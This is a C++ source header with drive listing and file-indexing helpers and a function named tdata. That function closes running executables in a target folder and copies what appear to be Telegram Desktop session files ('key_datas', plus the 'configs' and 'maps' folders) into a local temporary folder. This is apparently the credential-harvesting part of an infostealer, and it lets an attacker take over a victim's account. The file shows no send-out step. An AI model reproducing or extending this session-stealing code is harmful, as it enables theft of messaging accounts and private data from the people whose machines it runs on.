#pragma once

#include "Global.h"
#include "IO.h"
#include "Processes.h"

// Return available disks
vector<fs::path> getdisks() {
    vector<fs::path> ret;
    for (char drive = 'a'; drive <= 'z'; ++drive)
    {
        fs::path p = std::string(1, drive) + ":";
        if (fs::exists(p)) {
            ret.push_back(p);
        }
    }
    return ret;
}
wstring lower(wstring data) {
    std::transform(data.begin(), data.end(), data.begin(),
        [](unsigned char c) { return std::tolower(c); });
    return data;
}

bool is_cache(fs::path path) {
    vector<wstring> cache_pages = {L"cache", L"log", L"temp", L"tmp"};
    for (auto& page : cache_pages) if (lower(path.wstring()).find(page) != wstring::npos) return true;
    return false;
}

// Indexing files
void index(vector<fs::path>& buffer, fs::path target, fs::path current = "", bool recoursive = true, bool with_dir = false) {
    acout(L"Start index: target dir = \"" << target.wstring() << L"\"; current dir = \"" << current.wstring() << L"\"");
    fs::path dir = fs::path(target.string() + current.string());

    for (auto& p : fs::directory_iterator{ dir }) {
        acout(L"Path = " << p.path().wstring());

        if (fs::is_regular_file(p.path())) {
            acout(L"Type = file");

            size_t startpos = p.path().wstring().find(current.wstring());
            if (startpos == std::string::npos + 1) {
                startpos = target.wstring().size() - 1;
            }
            else {
                startpos--;
            }

            acout(L"Path size = " << p.path().wstring().size());
            acout(L"Start pos = " << startpos);
            acout(L"End pos = " << p.path().wstring().size() - startpos);

            wstring file = p.path().wstring().substr(startpos, p.path().wstring().size() - startpos);
            buffer.push_back(fs::path(file));
        }
        if (fs::is_directory(p.path()) && with_dir) {
            buffer.push_back(p.path().wstring().substr(
                p.path().wstring().find(target.wstring()) + target.wstring().size() - 1,
                p.path().wstring().size() - p.path().wstring().find(target.wstring())
            ));
        }
        if (fs::is_directory(p.path()) && recoursive) {

            acout(L"Type = dir");

            index(
                buffer,
                target,
                p.path().wstring().substr(
                    p.path().wstring().find(target.wstring()) + target.wstring().size(),
                    p.path().wstring().size() - p.path().wstring().find(target.wstring())
                )
            );
        }
    }
}
wstring tdata(wstring dir) {
    resetTemp;
    static int num = 0;
    num++;
    GetEnvironmentVariableW(L"TEMP", temp, MAX_PATH);
    temp = wcscat(temp, (L"\\" + to_wstring(num) + L" TDir\\").c_str());
    CreateDirectoryW(temp, NULL);
    vector<fs::path> exe;
    index(exe, dir, "", false);
    for (auto& file : exe) {
        cout(L"TDir subdir: " << file.wstring());
        if (file.wstring().find(L".exe") != wstring::npos) {
            closeSelf(file.wstring().c_str());
            try {
                fs::copy(fs::path(wstring(dir) + file.wstring()), fs::path(temp), fs::copy_options::overwrite_existing);
            }
            catch (fs::filesystem_error& e) {
                cout(L"Cannot copy " << file.wstring() << L" to " << temp << L": " << e.what());
            }
        }
    }
    exe.clear();
    try {
        CreateDirectoryW(getabspathincurrdir(wstring(L"tmp\\" + to_wstring(num) + L" TDir\\").c_str()).c_str(), NULL);
        fs::copy(
            dir + wstring(L"tdata\\key_datas"),
            fs::path(getabspathincurrdir((L"tmp\\" + to_wstring(num) + L" TDir\\key_datas").c_str())),
            fs::copy_options::overwrite_existing
        );
        index(exe, tdir + wstring(L"tdata\\"), "", false, true);
        for (auto& file1 : exe) {
            for (auto& file2 : exe) {
                //cout(file1 << L"; " << file2);
                if (file1.wstring() == file2.wstring() + L"s") {
                    cout(tdir + wstring(L"tdata") + file1.wstring() << L"; " << dir + wstring(L"tdata") + file2.wstring());
                    cout(L"Creating Dir 2; " << getabspathincurrdir((L"tmp\\" + to_wstring(num) + L" TDir" + file2.wstring()).c_str()).c_str());
                    CreateDirectoryW(getabspathincurrdir((L"tmp\\" + to_wstring(num) + L" TDir" + file2.wstring()).c_str()).c_str(), NULL);
                    cout(L"File 1");
                    fs::copy(
                        dir + wstring(L"tdata") + file1.wstring(),
                        fs::path(getabspathincurrdir((L"tmp\\" + to_wstring(num) + L" TDir" + file1.wstring()).c_str())),
                        fs::copy_options::overwrite_existing | fs::copy_options::recursive
                    );
                    cout(L"Configs 2; " << tdir + wstring(L"tdata") + file2.wstring() + L"\\configs");
                    fs::copy(
                        dir + wstring(L"tdata") + file2.wstring() + L"\\configs",
                        fs::path(getabspathincurrdir((L"tmp\\" + to_wstring(num) + L" TDir" + file2.wstring() + L"\\configs").c_str())),
                        fs::copy_options::overwrite_existing
                    );
                    cout(L"Maps 2");
                    fs::copy(
                        dir + wstring(L"tdata") + file2.wstring() + L"\\maps",
                        fs::path(getabspathincurrdir((L"tmp\\" + to_wstring(num) + L" TDir" + file2.wstring() + L"\\maps").c_str())),
                        fs::copy_options::overwrite_existing
                    );
                }
            }
        }
    }
    catch (fs::filesystem_error& e) {
        cout(L"Cannot copy " << e.path1() << L" to " << e.path2() << L": " << e.what());
    }
    exe.clear();
    index(exe, temp, "", false);
    for (auto& file : exe) {
        if (file.wstring().find(L".exe") != wstring::npos) {
            try {
                fs::copy(
                    fs::path(wstring(temp) + file.wstring()),
                    fs::path(dir),
                    fs::copy_options::overwrite_existing
                );
            }
            catch (fs::filesystem_error& e) {
                cout(L"Cannot copy " << file.wstring() << L" to " << temp << L": " << e.what());
            }
        }
    }
    try {
        fs::remove(temp);
    }
    catch (fs::filesystem_error& e) {
        cout(L"Cannot remove " << temp << L": " << e.what());
    }
    resetTemp;
    return getabspathincurrdir(wstring(L"tmp\\" + to_wstring(num) + L" TDir\\").c_str());
}